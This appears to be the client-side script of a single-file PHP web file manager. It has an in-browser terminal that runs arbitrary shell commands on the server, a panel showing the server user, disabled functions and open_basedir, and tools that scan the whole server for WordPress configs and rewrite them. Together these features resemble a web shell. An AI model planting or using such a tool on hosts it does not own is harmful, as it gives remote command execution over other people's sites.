    const icon = type === 'folder' ? '📁' : '📄';
    const label = type === 'folder' ? 'Folder' : 'File';
    showModal(`
        <h2>${icon} New ${label}</h2>
        <label>Name</label>
        <input type="text" id="createName" placeholder="Enter name...">
        <div class="modal-actions">
            <button class="btn" onclick="closeModal()">Cancel</button>
            <button class="btn primary" onclick="doCreate('${type}')">Create</button>
        </div>
    `);
    setTimeout(() => document.getElementById('createName').focus(), 100);
}
async function doCreate(type) {
    const name = document.getElementById('createName').value.trim();
    if (!name) return;
    const data = await apiPost('create', { dir: currentDir, name, type });
    toast(data.message, data.success ? 'success' : 'error');
    closeModal();
    refreshDir();
}

// ── Upload ─────────────────────────────────────
function showUploadModal() {
    showModal(`
        <h2>⬆️ Upload Files</h2>
        <div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()"
             ondragover="event.preventDefault();this.classList.add('dragover')"
             ondragleave="this.classList.remove('dragover')"
             ondrop="handleDrop(event)">
            <div class="icon">📁</div>
            <p>Drop files here or click to browse</p>
            <p class="sub">Maximum size: ${<?=json_encode(MAX_UPLOAD)?>}</p>
        </div>
        <input type="file" id="fileInput" multiple style="display:none" onchange="uploadFiles(this.files)">
        <div class="upload-progress" id="uploadProgress"></div>
        <div class="modal-actions">
            <button class="btn" onclick="closeModal()">Close</button>
        </div>
    `);
}

function handleDrop(e) {
    e.preventDefault();
    e.stopPropagation();
    document.getElementById('uploadZone').classList.remove('dragover');
    uploadFiles(e.dataTransfer.files);
}

async function uploadFiles(files) {
    if (!files.length) return;
    const prog = document.getElementById('uploadProgress');
    prog.style.display = 'block';
    prog.textContent = `Uploading ${files.length} file(s)...`;
    const fd = new FormData();
    fd.append('dir', currentDir);
    for (let f of files) fd.append('files[]', f);
    try {
        const resp = await fetch(SELF + '?action=upload', { method: 'POST', body: fd });
        const data = await resp.json();
        prog.textContent = data.message;
        toast(data.message, data.success ? 'success' : 'error');
        refreshDir();
    } catch (err) {
        prog.textContent = 'Upload failed';
        toast('Upload failed', 'error');
    }
}

// Global drag-and-drop on file panel
const filePanel = document.getElementById('filePanel');
filePanel.addEventListener('dragover', (e) => { e.preventDefault(); filePanel.classList.add('drag-active'); });
filePanel.addEventListener('dragleave', () => filePanel.classList.remove('drag-active'));
filePanel.addEventListener('drop', (e) => {
    e.preventDefault();
    filePanel.classList.remove('drag-active');
    if (e.dataTransfer.files.length) uploadFiles(e.dataTransfer.files);
});

// ── Search ─────────────────────────────────────
let searchTimeout;
function handleSearch(e) {
    clearTimeout(searchTimeout);
    const q = e.target.value.trim();
    if (!q) { renderFiles(); return; }
    if (q.length < 2) return;
    searchTimeout = setTimeout(async () => {
        // Client-side filter first
        const filtered = fileItems.filter(i => i.name.toLowerCase().includes(q.toLowerCase()));
        if (filtered.length > 0) {
            const tbody = document.getElementById('fileTableBody');
            fileItems._backup = fileItems._backup || [...fileItems];
            const saved = fileItems;
            fileItems = filtered;
            renderFiles();
            fileItems = saved;
        } else {
            // Server-side search
            const data = await api('search', { dir: currentDir, q });
            if (data.success && data.results.length) {
                const tbody = document.getElementById('fileTableBody');
                let html = '';
                data.results.forEach(r => {
                    const icon = getIcon(r.name, r.is_dir, false);
                    html += `<tr data-path="${esc(r.path)}" data-isdir="${r.is_dir}" data-name="${esc(r.name)}"
                                oncontextmenu="showCtx(event,this)" ondblclick="dblClickItem(this)">
                        <td><div class="fname" onclick="clickItem(this.parentElement.parentElement)">
                            <span class="ficon">${icon}</span><span class="ftext">${esc(r.name)}</span>
                        </div></td>
                        <td class="fsize" colspan="4" style="color:var(--text-muted);font-size:11px">${esc(r.path)}</td>
                        <td></td></tr>`;
                });
                tbody.innerHTML = html;
            }
        }
    }, 300);
}

// ── Terminal ───────────────────────────────────
function toggleTerminal() {
    const panel = document.getElementById('terminalPanel');
    panel.classList.toggle('show');
    if (panel.classList.contains('show')) {
        document.getElementById('termInput').focus();
    }
}
function clearTerminal() { document.getElementById('termOutput').innerHTML = ''; }

async function handleTermKey(e) {
    if (e.key === 'Enter') {
        const input = document.getElementById('termInput');
        const cmd = input.value.trim();
        if (!cmd) return;
        cmdHistory.push(cmd);
        cmdHistIdx = cmdHistory.length;
        input.value = '';
        const out = document.getElementById('termOutput');
        out.innerHTML += `<span style="color:var(--accent-3)">${shortPath(currentDir)} $</span> <span style="color:#fff">${esc(cmd)}</span>\n`;

        // Handle cd
        if (cmd.startsWith('cd ')) {
            const target = cmd.slice(3).trim();
            let dir = target;
            if (!target.startsWith('/')) dir = currentDir + '/' + target;
            navigateTo(dir);
            out.innerHTML += '\n';
            out.scrollTop = out.scrollHeight;
            return;
        }

        const data = await apiPost('exec', { cmd, dir: currentDir });
        if (data.output) out.innerHTML += esc(data.output) + '\n';
        out.innerHTML += '\n';
        out.scrollTop = out.scrollHeight;
    }
    if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (cmdHistIdx > 0) {
            cmdHistIdx--;
            document.getElementById('termInput').value = cmdHistory[cmdHistIdx];
        }
    }
    if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (cmdHistIdx < cmdHistory.length - 1) {
            cmdHistIdx++;
            document.getElementById('termInput').value = cmdHistory[cmdHistIdx];
        } else {
            cmdHistIdx = cmdHistory.length;
            document.getElementById('termInput').value = '';
        }
    }
}

// ── Modal ──────────────────────────────────────
function showModal(html) {
    document.getElementById('modalContent').innerHTML = html;
    document.getElementById('modalOverlay').classList.add('show');
}
function closeModal() {
    document.getElementById('modalOverlay').classList.remove('show');
}
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeModal();
        document.getElementById('ctxMenu').style.display = 'none';
    }
});

// ── Server Info ────────────────────────────────
async function showInfo() {
    const data = await api('info');
    if (!data.success) return;
    showModal(`
        <h2>ℹ️ Server Information</h2>
        <table style="width:100%;font-size:12px;border-collapse:collapse">
            <tr><td style="padding:8px;color:var(--text-muted)">PHP Version</td><td style="padding:8px">${data.php_version}</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">OS</td><td style="padding:8px">${data.os}</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">Server</td><td style="padding:8px">${data.server}</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">User</td><td style="padding:8px">${data.user} (${data.uid}:${data.gid})</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">Uname</td><td style="padding:8px;word-break:break-all;font-size:11px">${data.uname}</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">Document Root</td><td style="padding:8px;word-break:break-all">${data.doc_root}</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">Script Path</td><td style="padding:8px;word-break:break-all">${data.script}</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">Disk</td><td style="padding:8px">${data.free_space} free / ${data.total_space} total</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">Safe Mode</td><td style="padding:8px">${data.safe_mode}</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">Open Basedir</td><td style="padding:8px">${data.open_basedir}</td></tr>
            <tr><td style="padding:8px;color:var(--text-muted)">Disabled Functions</td><td style="padding:8px;word-break:break-all;font-size:10px;max-width:400px">${data.disable_functions || 'None'}</td></tr>
        </table>
        <div class="modal-actions"><button class="btn" onclick="closeModal()">Close</button></div>
    `);
}

// ── Sidebar Info ───────────────────────────────
async function loadSidebarInfo() {
    const data = await api('info');
    if (!data.success) return;
    document.getElementById('sidebar-info').innerHTML = `
        <div><span>PHP</span><span class="val">${data.php_version}</span></div>
        <div><span>OS</span><span class="val">${data.os}</span></div>
        <div><span>User</span><span class="val">${data.user}</span></div>
        <div><span>Disk</span><span class="val">${data.free_space}</span></div>
    `;
}

// ── Refresh ────────────────────────────────────
function refreshDir() { navigateTo(currentDir); }

// ── Keyboard Shortcuts ─────────────────────────
document.addEventListener('keydown', (e) => {
    // Ctrl+E: toggle editor
    if ((e.ctrlKey || e.metaKey) && e.key === 'e') { e.preventDefault(); closeEditor(); }
    // Ctrl+`: toggle terminal
    if ((e.ctrlKey || e.metaKey) && e.key === '`') { e.preventDefault(); toggleTerminal(); }
    // F5: refresh
    if (e.key === 'F5') { e.preventDefault(); refreshDir(); }
});

// ── WordPress Tools ────────────────────────────
async function wpScan() {
    toast('Scanning for wp-config.php...', 'success');
    const data = await api('wp_scan', { dir: '/' });
    if (!data.success || !data.configs.length) {
        showModal(`
            <h2>🔍 WordPress Scanner</h2>
            <p style="color:var(--text-secondary);padding:20px 0">No wp-config.php found on this server.<br>Try scanning a specific directory.</p>
            <label>Scan directory</label>
            <input type="text" id="wpScanDir" value="/var/www">
            <div class="modal-actions">
                <button class="btn" onclick="closeModal()">Close</button>
                <button class="btn primary" onclick="wpScanCustom()">Scan</button>
            </div>
        `);
        return;
    }
    wpShowScanResults(data.configs);
}

async function wpScanCustom() {
    const dir = document.getElementById('wpScanDir').value.trim();
    if (!dir) return;
    closeModal();
    toast('Scanning ' + dir + '...', 'success');
    const data = await api('wp_scan', { dir });
    if (!data.success || !data.configs.length) {
        toast('No wp-config.php found', 'error');
        return;
    }
    wpShowScanResults(data.configs);
}

function wpShowScanResults(configs) {
    let rows = configs.map(c => `
        <tr>
            <td style="padding:8px;font-size:12px;word-break:break-all;max-width:300px">${esc(c.path)}</td>
            <td style="padding:8px;font-size:12px">${c.writable ? '<span style="color:var(--accent-3)">✓ Writable</span>' : '<span style="color:var(--danger)">✕ Read-only</span>'}</td>
            <td style="padding:8px">
                <button class="btn primary" style="padding:4px 12px;font-size:11px" onclick="wpLoadConfig('${esc(c.path).replace(/'/g,"\\'")}')">
                    🔧 Harden
                </button>
            </td>
        </tr>
    `).join('');
    showModal(`
        <h2>🔍 Found ${configs.length} WordPress Installation(s)</h2>
        <table style="width:100%;border-collapse:collapse">
            <tr>
                <th style="padding:8px;text-align:left;color:var(--text-muted);font-size:11px">Path</th>
                <th style="padding:8px;text-align:left;color:var(--text-muted);font-size:11px">Status</th>
                <th style="padding:8px;font-size:11px"></th>
            </tr>
            ${rows}
        </table>
        <div class="modal-actions"><button class="btn" onclick="closeModal()">Close</button></div>
    `);
}

function wpTools() {
    showModal(`
        <h2>📝 WordPress Manual Path</h2>
        <p style="color:var(--text-secondary);margin-bottom:16px">Enter the path to wp-config.php manually.</p>
        <label>wp-config.php path</label>
        <div style="display:flex;gap:8px">
            <input type="text" id="wpConfigPath" placeholder="/var/www/html/wp-config.php" style="flex:1">
            <button class="btn" onclick="wpScan()">🔍 Scan</button>
        </div>
        <div class="modal-actions">
            <button class="btn" onclick="closeModal()">Cancel</button>
            <button class="btn primary" onclick="wpLoadConfig(document.getElementById('wpConfigPath').value)">Load & Configure</button>
        </div>
    `);
}

async function wpLoadConfig(path) {
    if (!path.trim()) { toast('Enter a path', 'error'); return; }
    const data = await api('wp_read', { file: path });
    if (!data.success) { toast(data.message, 'error'); return; }

    const c = data.constants;
    function chk(name, info, recommended) {
        const checked = info.exists ? (info.value === true || info.value === 'true') : false;
        const rec = recommended ? ' <span style="color:var(--accent-3);font-size:10px">(recommended)</span>' : '';
        const status = info.exists
            ? `<span style="font-size:10px;color:var(--text-muted)">Current: <strong style="color:${info.value === true || info.value === 'true' ? 'var(--accent-3)' : 'var(--danger)'}">${String(info.value)}</strong></span>`
            : '<span style="font-size:10px;color:var(--text-muted)">Not set</span>';
        return `
            <label style="display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,.02);border-radius:8px;margin-bottom:6px;cursor:pointer">
                <input type="checkbox" name="wp_const" value="${name}" ${checked ? 'checked' : ''}
                    style="width:16px;height:16px;accent-color:var(--accent)">
                <div style="flex:1">
                    <div style="font-family:monospace;font-size:12px;color:var(--text-primary)">${name}${rec}</div>
                    <div>${status}</div>
                </div>
            </label>`;
    }

    showModal(`
        <h2>🔧 WP Hardening — <span style="font-size:13px;color:var(--text-secondary)">${esc(path)}</span></h2>
        ${!data.writable ? '<div style="background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.2);border-radius:8px;padding:10px 14px;margin-bottom:16px;color:var(--danger);font-size:12px">⚠️ File is read-only. Changes may fail.</div>' : ''}

        <div style="margin-bottom:12px">
            <h3 style="font-size:12px;color:var(--accent);margin-bottom:8px">🛡️ Security Hardening</h3>
            ${chk('DISALLOW_FILE_EDIT', c.DISALLOW_FILE_EDIT, true)}
            ${chk('DISALLOW_FILE_MODS', c.DISALLOW_FILE_MODS, true)}
            ${chk('FORCE_SSL_ADMIN', c.FORCE_SSL_ADMIN, true)}
        </div>

        <div style="margin-bottom:12px">
            <h3 style="font-size:12px;color:var(--warning);margin-bottom:8px">🔄 Updates Control</h3>
            ${chk('AUTOMATIC_UPDATER_DISABLED', c.AUTOMATIC_UPDATER_DISABLED, false)}
            ${chk('WP_AUTO_UPDATE_CORE', c.WP_AUTO_UPDATE_CORE, false)}
        </div>

        <div style="margin-bottom:12px">
            <h3 style="font-size:12px;color:var(--accent-2);margin-bottom:8px">🐛 Debug</h3>
            ${chk('WP_DEBUG', c.WP_DEBUG, false)}
            ${chk('WP_DEBUG_LOG', c.WP_DEBUG_LOG, false)}
            ${chk('WP_DEBUG_DISPLAY', c.WP_DEBUG_DISPLAY, false)}
        </div>

        <div style="background:rgba(167,139,250,.06);border:1px solid rgba(167,139,250,.15);border-radius:8px;padding:10px 14px;font-size:11px;color:var(--text-secondary)">
            💡 <strong>DISALLOW_FILE_EDIT</strong> = disables Theme/Plugin editor in WP Admin<br>
            💡 <strong>DISALLOW_FILE_MODS</strong> = disables ALL file changes (install/update/delete plugins & themes)<br>
            📦 A backup of wp-config.php will be created automatically before patching.
        </div>

        <div class="modal-actions">
            <button class="btn" onclick="closeModal()">Cancel</button>
            <button class="btn danger" onclick="wpApplyPatch('${esc(path).replace(/'/g,"\\'")}', false)">Set All Unchecked → false</button>
            <button class="btn primary" onclick="wpApplyPatch('${esc(path).replace(/'/g,"\\'")}', true)">✅ Apply Checked → true</button>
        </div>
    `);
}

async function wpApplyPatch(file, mode) {
    const checkboxes = document.querySelectorAll('input[name="wp_const"]');
    const patches = {};
    checkboxes.forEach(cb => {
        if (mode) {
            // Apply: checked = true, unchecked = skip
            if (cb.checked) patches[cb.value] = true;
        } else {
            // Set unchecked to false
            if (!cb.checked) patches[cb.value] = false;
        }
    });
    if (Object.keys(patches).length === 0) {
        toast('No changes to apply', 'error');
        return;
    }
    const data = await apiPost('wp_patch', { file, patches });
    if (data.success) {
        toast(data.message + (data.backup ? ' (backup: ' + data.backup + ')' : ''), 'success');
        closeModal();
        // Reload the config view
        setTimeout(() => wpLoadConfig(file), 500);
    } else {
        toast(data.message, 'error');
    }
}

// ── WordPress Auto-Detect & Quick Lock ────────
let wpAutoPath = null;
let wpAutoData = null;
let wpAllConfigs = [];

async function wpAutoDetect() {
    try {
        const data = await api('wp_auto');
        if (!data.success || !data.found) {
            document.getElementById('wpSidebarStatus').style.display = 'block';
            document.getElementById('wpSidebarStatus').textContent = 'No WP detected — try Scan';
            return;
        }
        wpAutoPath = data.file;
        wpAutoData = data;
        wpAllConfigs = data.configs || [data];

        // Show the WP Lock button in topbar
        document.getElementById('wpLockBtn').style.display = '';

        // Update sidebar status
        const ss = document.getElementById('wpSidebarStatus');
        ss.style.display = 'block';

        // Count locked vs unlocked across ALL configs
        let totalLocked = 0, totalUnlocked = 0;
        wpAllConfigs.forEach(cfg => {
            const c = cfg.constants;
            const editOk = c.DISALLOW_FILE_EDIT.exists && (c.DISALLOW_FILE_EDIT.value === true || c.DISALLOW_FILE_EDIT.value === 'true');
            const modsOk = c.DISALLOW_FILE_MODS.exists && (c.DISALLOW_FILE_MODS.value === true || c.DISALLOW_FILE_MODS.value === 'true');
            if (editOk && modsOk) totalLocked++; else totalUnlocked++;
        });

        const allLocked = totalUnlocked === 0;
        const siteCount = wpAllConfigs.length;
        const multi = siteCount > 1;

        ss.innerHTML = `<span class="wp-status-dot ${allLocked ? 'green' : 'red'}"></span> ${multi ? siteCount + ' sites — ' : ''}${allLocked ? 'All Locked' : totalUnlocked + ' unlocked'}`;

        // Show banner
        const banner = document.getElementById('wpBanner');
        banner.className = `wp-banner detected ${allLocked ? 'locked' : 'unlocked'}`;

        if (allLocked) {
            banner.innerHTML = `
                <span class="wp-status-dot green"></span>
                <span class="wp-badge safe">LOCKED${multi ? ' ×'+siteCount : ''}</span>
                <span>${multi ? '<strong>'+siteCount+'</strong> WordPress sites' : 'WordPress'} hardened — file edit & plugin/theme upload <strong>disabled</strong></span>
                <span style="flex:1"></span>
                ${multi ? '<button class=\"btn\" style=\"padding:4px 12px;font-size:11px\" onclick=\"wpShowAll()\">📋 View All</button>' : '<span style=\"color:var(--text-muted);font-size:11px\">'+esc(data.file)+'</span>'}
                <button class="btn" style="padding:4px 12px;font-size:11px" onclick="wpAutoHarden()">⚙️ Configure</button>
            `;
        } else {
            banner.innerHTML = `
                <span class="wp-status-dot red"></span>
                <span class="wp-badge warn">${totalUnlocked} UNLOCKED</span>
                <span style="color:var(--danger)">${multi ? '<strong>'+totalUnlocked+'/'+siteCount+'</strong> WordPress sites' : 'WordPress'} <strong>NOT hardened</strong> — file edit & uploads enabled!</span>
                <span style="flex:1"></span>
                <button class="btn wp-lock" style="padding:5px 16px;font-size:12px" onclick="wpQuickLock()">🔒 ${multi ? 'Lock All ('+siteCount+')' : 'Lock Now'}</button>
                ${multi ? '<button class=\"btn\" style=\"padding:4px 12px;font-size:11px\" onclick=\"wpShowAll()\">📋 View All</button>' : ''}
                <button class="btn" style="padding:4px 12px;font-size:11px" onclick="wpAutoHarden()">⚙️ Details</button>
            `;
        }

        // Update lock button text
        const lockBtn = document.getElementById('wpLockBtn');
        if (allLocked) {
            lockBtn.innerHTML = `🔒 WP Locked${multi ? ' ('+siteCount+')' : ''}`;
            lockBtn.style.opacity = '0.7';
        } else {
            lockBtn.innerHTML = `🔓 Lock${multi ? ' All ('+siteCount+')' : ''}`;
            lockBtn.style.opacity = '1';
        }
    } catch(e) {
        console.log('WP auto-detect failed:', e);
    }
}

// Show all detected WP configs in a modal
function wpShowAll() {
    if (!wpAllConfigs.length) { wpAutoDetect(); return; }
    let rows = wpAllConfigs.map((cfg, i) => {
        const c = cfg.constants;
        const editOk = c.DISALLOW_FILE_EDIT.exists && (c.DISALLOW_FILE_EDIT.value === true || c.DISALLOW_FILE_EDIT.value === 'true');
        const modsOk = c.DISALLOW_FILE_MODS.exists && (c.DISALLOW_FILE_MODS.value === true || c.DISALLOW_FILE_MODS.value === 'true');
        const locked = editOk && modsOk;
        return `
            <tr style="border-bottom:1px solid var(--border)">
                <td style="padding:10px 8px;font-size:12px;word-break:break-all;max-width:280px">${esc(cfg.file)}</td>
                <td style="padding:10px 8px;text-align:center">
                    <span class="wp-status-dot ${locked?'green':'red'}" style="animation:none"></span>
                    <span style="font-size:11px;color:${locked?'var(--accent-3)':'var(--danger)'};margin-left:4px">${locked?'Locked':'Open'}</span>
                </td>
                <td style="padding:10px 8px;font-size:11px;color:var(--text-muted)">${cfg.writable?'✓ Writable':'✕ Read-only'}</td>
                <td style="padding:10px 8px;text-align:right">
                    <button class="btn primary" style="padding:4px 10px;font-size:11px" onclick="wpLoadConfig('${esc(cfg.file).replace(/'/g,"\\\\'")}')">🔧 Configure</button>
                    ${!locked ? '<button class=\"btn wp-lock\" style=\"padding:4px 10px;font-size:11px;margin-left:4px\" onclick=\"wpLockSingle(\''+esc(cfg.file).replace(/'/g,"\\\\'")+'\')\">\uD83D\uDD12 Lock</button>' : ''}
                </td>
            </tr>`;
    }).join('');

    showModal(`
        <h2>📋 All Detected WordPress Sites (${wpAllConfigs.length})</h2>
        <table style="width:100%;border-collapse:collapse">
            <tr>
                <th style="padding:8px;text-align:left;color:var(--text-muted);font-size:10px;text-transform:uppercase">wp-config.php</th>
                <th style="padding:8px;text-align:center;color:var(--text-muted);font-size:10px;text-transform:uppercase">Status</th>
                <th style="padding:8px;color:var(--text-muted);font-size:10px;text-transform:uppercase">Perms</th>
                <th style="padding:8px;font-size:10px"></th>
            </tr>
            ${rows}
        </table>
        <div class="modal-actions">
            <button class="btn" onclick="closeModal()">Close</button>
            <button class="btn wp-lock" onclick="wpQuickLock()">🔒 Lock All (${wpAllConfigs.length})</button>
        </div>
    `);
}

// Lock a single wp-config
async function wpLockSingle(file) {
    const patches = { 'DISALLOW_FILE_EDIT': true, 'DISALLOW_FILE_MODS': true };
    toast('Locking ' + file.split('/').slice(-2).join('/') + '...', 'success');
    const result = await apiPost('wp_patch', { file, patches });
    if (result.success) {
        toast('✅ Locked! ' + (result.backup ? 'Backup: ' + result.backup : ''), 'success');
    } else {
        toast(result.message, 'error');
    }
    await wpAutoDetect();
    closeModal();
    wpShowAll();
}

async function wpQuickLock() {
    // Detect if not already detected
    if (!wpAllConfigs.length) {
        const data = await api('wp_auto');
        if (!data.success || !data.found) {
            toast('No wp-config.php found anywhere! Use Manual Path or Scan.', 'error');
            return;
        }
        wpAutoPath = data.file;
        wpAutoData = data;
        wpAllConfigs = data.configs || [data];
    }

    const patches = { 'DISALLOW_FILE_EDIT': true, 'DISALLOW_FILE_MODS': true };
    const total = wpAllConfigs.length;
    let success = 0, failed = 0;

    toast(`Locking ${total} WordPress site(s)...`, 'success');

    // Lock ALL configs in sequence
    for (const cfg of wpAllConfigs) {
        try {
            const result = await apiPost('wp_patch', { file: cfg.file, patches });
            if (result.success) success++;
            else failed++;
        } catch(e) {
            failed++;
        }
    }

    if (failed === 0) {
        toast(`✅ All ${success} site(s) LOCKED! File edit & plugin/theme uploads disabled.`, 'success');
    } else {
        toast(`Locked ${success}/${total} — ${failed} failed (check permissions)`, failed > 0 ? 'error' : 'success');
    }

    // Refresh detection
    closeModal();
    await wpAutoDetect();
}

async function wpAutoHarden() {
    if (!wpAllConfigs.length) {
        const data = await api('wp_auto');
        if (!data.success || !data.found) {
            toast('No wp-config.php auto-detected. Use Manual Path or Scan.', 'error');
            wpTools();
            return;
        }
        wpAutoPath = data.file;
        wpAllConfigs = data.configs || [data];
    }
    // If multiple sites, show picker first
    if (wpAllConfigs.length > 1) {
        wpShowAll();
    } else {
        wpLoadConfig(wpAllConfigs[0].file);
    }
}

// ── Init ───────────────────────────────────────
navigateTo(currentDir);
loadSidebarInfo();
wpAutoDetect();
</script>

</body>
</html>
